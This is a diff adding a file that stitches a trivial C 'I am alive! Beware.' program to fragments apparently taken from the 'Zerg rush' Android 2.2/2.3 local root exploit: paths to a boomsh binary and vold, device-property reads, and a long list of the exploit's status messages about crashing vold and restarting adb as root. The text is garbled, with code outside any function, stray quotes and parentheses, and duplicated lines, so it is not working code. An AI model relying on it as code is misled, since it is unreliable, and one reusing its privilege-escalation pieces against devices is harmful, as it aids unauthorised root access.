@@ -1,0 +1,58 @@
+#include <stdio.h>
+int main()
+{
+    printf( "I am alive!  Beware.\n" );
+    getchar();
+    return 0;
+}
+
+static pid_t logcat_pid = 0;
+static char *sh = "/data/local/tmp/sh";
+static char *bsh = "/data/local/tmp/boomsh";
+static char *crashlog = "/data/local/tmp/crashlog";
+static char *vold = "/system/bin/vold";
+
+__system_property_get("ro.build.version.release", version_release);
+__system_property_get("ro.build.fingerprint", version_release);
+__system_property_get("ro.product.model", device);
+__system_property_get("ro.build.display.id", build_id);
+  
+[+] Overseer found a path !
+[-] No path found, let's hope
+[*] Sleeping a bit (~40s)...
+[*] Waking !
+LORDZZZZzzzz
+[*] Popping %d more zerglings
+[-] Error creating Nydus
+[-] Colossus, we're doomed!
+[*] Sending %d zerglings ...
+[-] Nydus seems broken
+[-] You need more minerals !
+[-] You need more vespene gas !
+[-] Zerglings did not cause crash
+[-] Zerglings did not leave stuff at all
+[**] Zerg rush - Android 2.2/2.3 local root
+[**] (C) 2011 Revolutionary. All rights reserved.
+[**] Parts of code from Gingerbreak, (C) 2010-2011 The Android Exploid Crew.
+[-] Cannot copy boomsh.
+[+] Found a Froyo ! 0x%08x\
+[+] Found a GingerBread ! 0x%08x
+[-] Not a 2.2/2.3 Android ...\n")
+[+] Found a Samsung, running Samsung mode
+[-] High templars, we're doomed!\n")
+[*] Scooting ...\n")
+[+] Zerglings found a way to enter ! 0x%02x\n", buffsz)
+[-] Hellions with BLUE flames !\n")
+[+] Zerglings caused crash (good news): 0x%08x 0x%04x
+[-] Zerglings did not leave interesting stuff
+[-] Siege tanks, we're doomed!
+[-] Siege tanks, we're doomed!
+[-] This terran has walled!\n")
+[*] Creating more creep 0x%08x ...\n
+[-] High templars, we're doomed!
+[*] Researching Metabolic Boost ...
+[+] Speedlings on the go !
+[+] Rush did it ! It's a GG, man !
+[+] Killing ADB and restarting as root... enjoy!
+[-] Failed to set property to restart adb. Not killing.
+[-] Bad luck, our rush did not succeed :(
